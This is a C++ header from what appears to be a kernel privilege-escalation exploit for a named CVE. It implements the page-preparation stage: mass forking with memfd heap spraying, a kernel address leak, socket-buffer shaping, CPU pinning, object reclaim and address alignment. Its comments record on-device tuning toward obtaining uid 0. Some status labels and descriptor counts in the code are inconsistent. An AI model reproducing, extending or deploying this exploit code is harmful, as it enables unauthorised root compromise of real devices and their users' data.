#pragma once
#include <cstdio>
/** @file backend/cve_2026_43499/memory/prepare_page.hpp
 *  One page preparation: the twelve phases, in order, over two seams.
 *
 *  This file is where the decision pieces meet the kernel. It owns the order (read
 *  from prepare_steps), the sizes (from prepare_plan), the shape of the socket work
 *  (from shaping_plan), the closes (from reclaim_plan) and the alignment (from
 *  page_geometry), and it calls the platform through a seam so that a host test can
 *  drive the whole thing with fakes -- including the failure paths, which are the
 *  part of an orchestration most likely to be wrong and least likely to be exercised.
 *
 *  Two policies, not one. The address search is its own mechanism with its own
 *  geometry, lifecycle and waiting, so it is injected rather than folded into the
 *  seam: a fake search can be told to find nothing, which is how the no-collision
 *  path is tested at all.
 *
 *  State lives on the caller's stack: this tree allows one mutable global and it is
 *  not this.
 *
 *  NOT YET IN THE SEQUENCE: the retired tree prepared a payload inside the page and
 *  had a failure path for it. That write is not ported yet, so the phases here stop
 *  short of it deliberately -- a preparation that aligns an address and says where it
 *  stopped is honest; one that pretends to have prepared a page it did not touch is
 *  not.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/memory/heap_geometry.hpp"
#include "backend/cve_2026_43499/memory/heap_seam.hpp"
#include "backend/cve_2026_43499/memory/prepare_plan.hpp"
#include "backend/cve_2026_43499/memory/reclaim_plan.hpp"
#include "backend/cve_2026_43499/memory/shaping_plan.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    /** The most children one preparation holds, so its state can live on a stack. */
    /** 每组能有多少子进程。退役的 groom 规模是 `8 × mm_objs_per_slab`（= 256 ✓）与
     *  `(1 + MM_PARTIALS) × mm_objs_per_slab`（= 192 ✓），本树原值 32 只有它的 1/8 ✗ ⇒
     *  真机实测：顶到 32 时三步完整率 2/3 ✓（组数=1/2 时约 1/8 ✗）⇒ 规模确实抬高奇偶命中率 ✓。
     *  抬到 512 以容纳退役规模 ✓（只加容量，算法不变 ✓）。 */
    inline constexpr std::size_t kMaxPrepareChildren = 512U;

    /** The address search, as the preparation needs it: start it, ask it, reset it.
     *
     *  An instance rather than a type: a search holds the answer it found, and a caller that
     *  handed over a type would be saying the search has no state, which is false for every real
     *  one. The policy the device uses runs the whole search on start and answers from what came
     *  back. */
    template <class Snitch>
    concept AddressSnitch = requires(Snitch &snitch, std::size_t collisions) {
        /* The answer comes back from the call, not out of the object: a device run showed the
         *  one working and the other not, so the interface uses the one that works. What it has
         *  to carry is spelled by member rather than by type, so this layer does not need to
         *  know the search implementation's vocabulary. */
        { snitch.start(collisions).ran } -> std::convertible_to<bool>;
        { snitch.start(collisions).found } -> std::convertible_to<bool>;
        { snitch.start(collisions).address } -> std::convertible_to<std::uint64_t>;
        { snitch.has_collision() } -> std::same_as<bool>;
        { snitch.address() } -> std::same_as<std::uint64_t>;
        { snitch.reset() } -> std::same_as<void>;
    };

    /** Where a preparation stopped, and why. */
    enum class PrepareStatus : unsigned char {
        Ok = 0,
        /** A size or geometry the preparation cannot act on. */
        Refused = 1,
        /** The search found nothing before the caller's patience ran out. */
        NoCollision = 2,
        /** A platform call failed; the phase that made it is in the outcome. */
        CallFailed = 3,
    };

    [[nodiscard]] constexpr const char *prepare_status_name(PrepareStatus status) noexcept {
        switch (status) {
            case PrepareStatus::Ok: return "ok";
            case PrepareStatus::Refused: return "geometry-missing";
            case PrepareStatus::NoCollision: return "plan-missing";
            case PrepareStatus::CallFailed: return "call-failed";
        }
        return "unknown";
    }

    /** What a preparation did, and where it stopped when it stopped early. */
    struct PrepareOutcome final {
        PrepareStatus status = PrepareStatus::Refused;
        /** The phase it was in: a name from the order table. */
        PrepareStep at_step = PrepareStep::Cleanup;
        /** The address it settled on, aligned, when it got that far. */
        std::uint64_t base = 0U;
        /** 选项 B 的通道：shaping 的**发送端**（调用方用它 send_bytes 把页面送进内核 ✓）。
         *  -1 表示未交出 ⇒ 调用方以此为**具名拒绝**依据，不假装成功。 */
        std::int32_t shaping_fd = -1;
        /** 它的对端（SIGPIPE 的代价：对端不能先关 ✗）。 */
        std::int32_t shaping_peer_fd = -1;
        /** How many descriptors it opened and how many it gave back. */
        std::size_t opened = 0U;
        std::size_t closed = 0U;
        /** The same counts per group, so a gap can name its group instead of being guessed at. */
        std::size_t opened_pre = 0U;
        std::size_t opened_spray = 0U;
        std::size_t opened_post = 0U;
        std::size_t opened_leak = 0U;
        std::size_t closed_pre = 0U;
        std::size_t closed_spray = 0U;
        std::size_t closed_post = 0U;
        std::size_t closed_leak = 0U;
        /** What the LeakLoop saw: whether the search answered, and with which address. */
        std::uint8_t snitch_found = 0U;
        std::uint64_t snitch_address = 0U;
        /** The errno the failing call reported, when one did. */
        std::int32_t error = 0;
    };

    /** What the caller is willing to wait, and how many attempts it allows. */
    struct PreparePatience final {
        std::uint32_t max_attempts = 0U;
        std::size_t poll_rounds = 0U;
    };

    /** Run one preparation. See the file note for what is deliberately not in the
     *  sequence yet. */
    template <HeapSeam Seam, AddressSnitch Snitch>
    [[nodiscard]] PrepareOutcome prepare_page(const PrepareInputs &inputs, const PageGeometry &geometry,
                                              const PreparePatience &patience, Snitch &snitch) noexcept;

    namespace detail {
        /** The children and descriptors one preparation holds. On the caller's stack. */
        struct PrepareState final {
            std::uint64_t pre_pids[kMaxPrepareChildren] = {};
            std::int32_t pre_fds[kMaxPrepareChildren] = {};
            std::uint64_t post_pids[kMaxPrepareChildren] = {};
            std::int32_t post_fds[kMaxPrepareChildren] = {};
            std::uint64_t spray_pids[kMaxPrepareChildren] = {};
            std::int32_t spray_fds[kMaxPrepareChildren] = {};
            std::uint64_t leak_pid = 0U;
            std::int32_t leak_fd = -1;
            std::size_t pre = 0U;
            std::size_t post = 0U;
            std::size_t spray = 0U;
        };

        /** How many times a preparation lets the scheduler run before it reads the
         *  state it just set up: the retired tree yielded four times, which is timing
         *  rather than a quantity anybody tunes. */
        inline constexpr std::size_t kSettleYields = 4U;

        /** Kill everything a preparation forked, in the order the retired tree used. */
        template <HeapSeam Seam>
        void kill_children(PrepareState &state) noexcept {
            for (std::size_t i = 0U; i < state.pre; ++i) {
                (void) Seam::stop_child(state.pre_pids[i]);
            }
            for (std::size_t i = 0U; i < state.post; ++i) {
                (void) Seam::stop_child(state.post_pids[i]);
            }
            for (std::size_t i = 0U; i < state.spray; ++i) {
                (void) Seam::stop_child(state.spray_pids[i]);
            }
            if (state.leak_pid != 0U) {
                (void) Seam::stop_child(state.leak_pid);
            }
        }

        /** Give every descriptor back, in the order the reclaim plan names. */
        template <HeapSeam Seam>
        std::size_t close_them_all(PrepareState &state, const ReclaimCounts &counts,
                                  std::size_t *closed_pre = nullptr, std::size_t *closed_spray = nullptr,
                                  std::size_t *closed_post = nullptr) noexcept {
            ReclaimStep steps[kMaxReclaimSteps] = {};
            std::size_t written = 0U;
            if (plan_reclaim(counts, steps, kMaxReclaimSteps, written) != ReclaimVerdict::Ok) {
                return 0U;
            }
            std::size_t closed = 0U;
            for (std::size_t i = 0U; i < written; ++i) {
                std::int32_t fd = -1;
                switch (steps[i].group) {
                    case ReclaimGroup::Pre:
                        fd = state.pre_fds[steps[i].index];
                        break;
                    case ReclaimGroup::Post:
                        fd = state.post_fds[steps[i].index];
                        break;
                    case ReclaimGroup::Spray:
                        fd = state.spray_fds[steps[i].index];
                        break;
                    case ReclaimGroup::Shaping:
                    case ReclaimGroup::Leak:
                        /* Handled after the walk: the shaping pair is local to the
                         *  shaping phase and the leak descriptor is the last close. */
                        continue;
                }
                if (fd >= 0) {
                    (void) Seam::close_fd(fd);
                    ++closed;
                    /* Mark it gone in the state too: an early return closes whatever is still
                     *  open, and it must not close the same descriptor twice. */
                    switch (steps[i].group) {
                        case ReclaimGroup::Pre: state.pre_fds[steps[i].index] = -1; break;
                        case ReclaimGroup::Post: state.post_fds[steps[i].index] = -1; break;
                        case ReclaimGroup::Spray: state.spray_fds[steps[i].index] = -1; break;
                        case ReclaimGroup::Shaping:
                        case ReclaimGroup::Leak: break;
                    }
                    switch (steps[i].group) {
                        case ReclaimGroup::Pre: if (closed_pre != nullptr) { ++(*closed_pre); } break;
                        case ReclaimGroup::Post: if (closed_post != nullptr) { ++(*closed_post); } break;
                        case ReclaimGroup::Spray: if (closed_spray != nullptr) { ++(*closed_spray); } break;
                        case ReclaimGroup::Shaping:
                        case ReclaimGroup::Leak: break;
                    }
                }
            }
            return closed;
        }
    }  // namespace detail

    template <HeapSeam Seam, AddressSnitch Snitch>
    PrepareOutcome prepare_page(const PrepareInputs &inputs, const PageGeometry &geometry,
                                const PreparePatience &patience, Snitch &snitch) noexcept {
        PrepareOutcome outcome{};
        detail::PrepareState state{};

        /* Contexts: the sizes, and the check that the region is this device's. */
        outcome.at_step = PrepareStep::Contexts;
        PreparePlan plan{};
        if (build_prepare_plan(inputs, plan) != PrepareVerdict::Ok) {
            outcome.status = PrepareStatus::Refused;
            return outcome;
        }
        if (plan.pre_groups > kMaxPrepareChildren || plan.spray_groups > kMaxPrepareChildren ||
            plan.post_groups > kMaxPrepareChildren || patience.max_attempts == 0U) {
            outcome.status = PrepareStatus::Refused;
            return outcome;
        }
        const SeamResult page = Seam::page_size();
        if (page.value <= 0) {
            outcome.status = PrepareStatus::CallFailed;
            outcome.error = page.error;
            return outcome;
        }
        if (check_region_matches_device(geometry.align_region_size,
                                        static_cast<std::uint64_t>(page.value)) !=
            HeapGeometryVerdict::Ok) {
            outcome.status = PrepareStatus::Refused;
            outcome.at_step = PrepareStep::Contexts;
            return outcome;
        }

        /* PreChildren then SprayChildren: fork, then that child's descriptor. */
        outcome.at_step = PrepareStep::PreChildren;
        for (std::size_t i = 0U; i < plan.pre_groups; ++i) {
            const SeamResult child = Seam::fork_child();
            if (child.value == 0) {
                /* In the child. Its work is not ported yet, and what it must not do is return
                 *  into the caller: a device run showed what that looks like -- the children ran
                 *  the rest of the probe, one report each, which is the trap this branch exists
                 *  to close. A child with nothing to do leaves at once. The memory such a child
                 *  is meant to hold is a later piece, and it cannot be held by a process that
                 *  exits, which is exactly why this is written down rather than left implicit. */
                Seam::exit_child();
            }
            if (child.value <= 0) {
                outcome.status = PrepareStatus::CallFailed;
                outcome.error = child.error;
                detail::kill_children<Seam>(state);
                return outcome;
            }
            state.pre_pids[i] = static_cast<std::uint64_t>(child.value);
            state.pre_fds[i] = static_cast<std::int32_t>(Seam::open_memfd(state.pre_pids[i]).value);
            ++state.pre;
            /* 只有真的开成才算一个描述符：被拒的开（fd < 0）既不会被归还，也不该被数成开了。 */
            if (state.pre_fds[state.pre - 1U] >= 0) { ++outcome.opened; ++outcome.opened_pre; }
        }
        /* 退役 `pre_ctx`（spray 之后、snitch 之前 ✓）：整形泄漏落点 ⇒ 奇偶的直接来源 ✓。
         *  数量走文档（`heap.pre_shaped_groups` ✓）；为 0 时本相位不存在（与旧行为一致 ✓）。 */
        for (std::size_t i = 0U; i < plan.pre_shaped_groups; ++i) {
            const SeamResult child = Seam::fork_child();
            if (child.value == 0) {
                Seam::exit_child();
            }
            if (child.value <= 0) {
                outcome.status = PrepareStatus::CallFailed;
                outcome.error = child.error;
                detail::kill_children<Seam>(state);
                return outcome;
            }
            state.pre_pids[state.pre] = static_cast<std::uint64_t>(child.value);
            state.pre_fds[state.pre] =
                    static_cast<std::int32_t>(Seam::open_memfd(state.pre_pids[state.pre]).value);
            ++state.pre;
            if (state.pre_fds[state.pre - 1U] >= 0) { ++outcome.opened; ++outcome.opened_pre; }
        }
        outcome.at_step = PrepareStep::SprayChildren;
        for (std::size_t i = 0U; i < plan.spray_groups; ++i) {
            const SeamResult child = Seam::fork_child();
            if (child.value == 0) {
                /* In the child. Its work is not ported yet, and what it must not do is return
                 *  into the caller: a device run showed what that looks like -- the children ran
                 *  the rest of the probe, one report each, which is the trap this branch exists
                 *  to close. A child with nothing to do leaves at once. The memory such a child
                 *  is meant to hold is a later piece, and it cannot be held by a process that
                 *  exits, which is exactly why this is written down rather than left implicit. */
                Seam::exit_child();
            }
            if (child.value <= 0) {
                outcome.status = PrepareStatus::CallFailed;
                outcome.error = child.error;
                detail::kill_children<Seam>(state);
                return outcome;
            }
            state.spray_pids[i] = static_cast<std::uint64_t>(child.value);
            state.spray_fds[i] =
                static_cast<std::int32_t>(Seam::open_memfd(state.spray_pids[i]).value);
            ++state.spray;
            if (state.spray_fds[state.spray - 1U] >= 0) { ++outcome.opened; ++outcome.opened_spray; }
        }

        /* The search, then the children that wait for it. */
        outcome.at_step = PrepareStep::Snitch;
        if (!snitch.start(plan.snitch_collisions).ran) {
            outcome.status = PrepareStatus::CallFailed;
            detail::kill_children<Seam>(state);
            return outcome;
        }
        outcome.at_step = PrepareStep::PostChildren;
        for (std::size_t i = 0U; i < plan.post_groups; ++i) {
            const SeamResult child = Seam::fork_child();
            if (child.value == 0) {
                /* In the child. Its work is not ported yet, and what it must not do is return
                 *  into the caller: a device run showed what that looks like -- the children ran
                 *  the rest of the probe, one report each, which is the trap this branch exists
                 *  to close. A child with nothing to do leaves at once. The memory such a child
                 *  is meant to hold is a later piece, and it cannot be held by a process that
                 *  exits, which is exactly why this is written down rather than left implicit. */
                Seam::exit_child();
            }
            if (child.value <= 0) {
                outcome.status = PrepareStatus::CallFailed;
                outcome.error = child.error;
                snitch.reset();
                detail::kill_children<Seam>(state);
                return outcome;
            }
            state.post_pids[i] = static_cast<std::uint64_t>(child.value);
            state.post_fds[i] = static_cast<std::int32_t>(Seam::open_memfd(state.post_pids[i]).value);
            ++state.post;
            if (state.post_fds[state.post - 1U] >= 0) { ++outcome.opened; ++outcome.opened_post; }
        }
        const SeamResult leak_child = Seam::fork_child();
        if (leak_child.value > 0) {
            state.leak_pid = static_cast<std::uint64_t>(leak_child.value);
            state.leak_fd = static_cast<std::int32_t>(Seam::open_memfd(state.leak_pid).value);
            if (state.leak_fd >= 0) { ++outcome.opened; ++outcome.opened_leak; }
        }

        /* KillParts: every child whose descriptor this preparation does not need alive. */
        outcome.at_step = PrepareStep::KillPartials;
        detail::kill_children<Seam>(state);

        /* LeakLoop, and the failure path that matters most on a device: a search that
         *  finds nothing. Reset, kill, give the descriptors back, stop. */
        outcome.at_step = PrepareStep::LeakLoop;
        bool found = false;
        for (std::size_t round = 0U; round < patience.poll_rounds && !found; ++round) {
            found = snitch.has_collision();
        }
        const std::uint64_t leaked = snitch.address();
        /* 把 LeakLoop 当时看到的答案记下来（reset 之前）：设备上分辨「没找到」与「没问对」就靠它。 */
        outcome.snitch_found = found ? 1U : 0U;
        outcome.snitch_address = leaked;
        if (!found || leaked == 0U) {
            snitch.reset();
            ReclaimCounts counts{};
            counts.pre = state.pre;
            counts.post = state.post;
            counts.spray = state.spray;
            counts.mm_objs_per_slab = plan.objects_per_region;
            counts.shaped = false;
            outcome.closed = detail::close_them_all<Seam>(state, counts, &outcome.closed_pre,
                                                          &outcome.closed_spray,
                                                          &outcome.closed_post);
            /* The leak descriptor goes back here too. The success path keeps it until
             *  last because the reclaim depends on it; a preparation that stops early
             *  has nothing left to depend on it, and a device run found this the hard
             *  way: the walk deliberately skips the leak group, so returning without
             *  closing it left one descriptor open on the failure a device is most
             *  likely to hit. */
            /* Everything still open goes back here. The reclaim plan names only the descriptors the
             *  writes still need, and this path makes no writes; the per-group count on a device
             *  named the two groups that were left behind: post (1 opened, 0 closed, with the same
             *  reading before and after the spray groups grew) and then spray (2 opened, 1 closed
             *  once a second spray group existed). The leak descriptor goes last, as everywhere. */
            for (std::size_t i = 0U; i < state.pre; ++i) {
                if (state.pre_fds[i] >= 0) {
                    (void) Seam::close_fd(state.pre_fds[i]);
                    state.pre_fds[i] = -1;
                    ++outcome.closed;
                    ++outcome.closed_pre;
                }
            }
            for (std::size_t i = 0U; i < state.spray; ++i) {
                if (state.spray_fds[i] >= 0) {
                    (void) Seam::close_fd(state.spray_fds[i]);
                    state.spray_fds[i] = -1;
                    ++outcome.closed;
                    ++outcome.closed_spray;
                }
            }
            for (std::size_t i = 0U; i < state.post; ++i) {
                if (state.post_fds[i] >= 0) {
                    (void) Seam::close_fd(state.post_fds[i]);
                    state.post_fds[i] = -1;
                    ++outcome.closed;
                    ++outcome.closed_post;
                }
            }
            if (state.leak_fd >= 0) {
                (void) Seam::close_fd(state.leak_fd);
                ++outcome.closed;
            }
            outcome.status = PrepareStatus::NoCollision;
            return outcome;
        }

        /* Shaping: the two pairs, each action on the end the plan names. */
        outcome.at_step = PrepareStep::Shaping;
        ShapingInputs shaping{};
        shaping.socket_buffer = geometry.socket_buffer;
        shaping.send_size = geometry.send_size;
        ShapingPlan shaped{};
        std::int32_t reclaim_pair[2] = {-1, -1};
        std::int32_t shaping_pair[2] = {-1, -1};
        if (build_shaping_plan(shaping, shaped) == ShapingVerdict::Ok) {
            (void) Seam::socket_pair(reclaim_pair);
            if (state.leak_fd >= 0) {
                ++outcome.opened;
            }
            for (std::size_t i = 0U; i < shaped.action_count; ++i) {
                const ShapingAction &action = shaped.actions[i];
                if (action.role == ShapingPairRole::Reclaim) {
                    if (action.set_buffer) {
                        (void) Seam::set_socket_buffer(reclaim_pair[0], action.buffer_bytes);
                    }
                    if (action.nonblocking) {
                        (void) Seam::set_nonblocking(reclaim_pair[0]);
                    }
                } else {
                    (void) Seam::socket_pair(shaping_pair);
                    if (action.sends) {
                        (void) Seam::send_buffer(shaping_pair[0], action.send_bytes);
                    }
                }
            }
        }

        /* PinAndYield: the owner's processor, then let the scheduler run. */
        outcome.at_step = PrepareStep::PinAndYield;
        (void) Seam::pin_to_processor(geometry.main_cpu);
        for (std::size_t i = 0U; i < detail::kSettleYields; ++i) {
            (void) Seam::yield_now();
        }

        /* Reclaim: every descriptor back, in the plan's order, the shaping pair and
         *  then the leak descriptor last of all. */
        outcome.at_step = PrepareStep::Reclaim;
        ReclaimCounts counts{};
        counts.pre = state.pre;
        counts.post = state.post;
        counts.spray = state.spray;
        counts.mm_objs_per_slab = plan.objects_per_region;
        counts.shaped = true;
        outcome.closed = detail::close_them_all<Seam>(state, counts, &outcome.closed_pre,
                                                          &outcome.closed_spray,
                                                          &outcome.closed_post);
        /* ★ 成功路径也要**停子进程**（新目标「取得 uid0」第 8 轮 ✓）：四组 pid 原先只活在
         *  `PrepareState`（栈 ✓）⇒ 返回即丢 ⇒ 调用方**结构上无法回收** ✗ ⇒ 每轮遗留 ~450 个子进程
         *  （真机 pre=284 / post=32 / spray=191 ✓）⇒ 5–6 轮触 **EAGAIN** ⇒ `victim-fork-failed` ✗。
         *  ⚠ 实验性放置（方案 A ✓）：真机须确认路由不再依赖这些子进程的内存形状 ✓；
         *  判据 = `stamp`/`successes` 与修前一致 ✓ 且 `victim fork failed errno=` 消失 ✓。 */
        detail::kill_children<Seam>(state);
        for (std::size_t end = 0U; end < 2U; ++end) {
            if (reclaim_pair[end] >= 0) {
                (void) Seam::close_fd(reclaim_pair[end]);
                ++outcome.closed;
            }
            if (shaping_pair[end] >= 0) {
                /* 选项 B：**发送端留着交给调用方**（退役的 shaping 发送端在 spray 之后才关 ✓）：
                 *  这里只关另一端；发送端进 outcome，调用方发完页面自行关闭。 */
                /* 两端都留给调用方：只留发送端会让对端消失 ⇒ send 撞 SIGPIPE（真机量到 141 ✗）。 */
                if (end == 0U) {
                    outcome.shaping_fd = shaping_pair[0];
                } else {
                    outcome.shaping_peer_fd = shaping_pair[1];
                }
            }
        }
        if (state.leak_fd >= 0) {
            (void) Seam::close_fd(state.leak_fd);
            ++outcome.closed;
        }

        /* Align, and the last failure path: an address that has no region. */
        outcome.at_step = PrepareStep::Align;
        outcome.base = align_base(leaked, geometry.align_region_size);
        if (outcome.base == 0U) {
            outcome.status = PrepareStatus::NoCollision;
            return outcome;
        }
        outcome.status = PrepareStatus::Ok;
        return outcome;
    }
}  // namespace ghostlock::backend::cve_2026_43499::memory

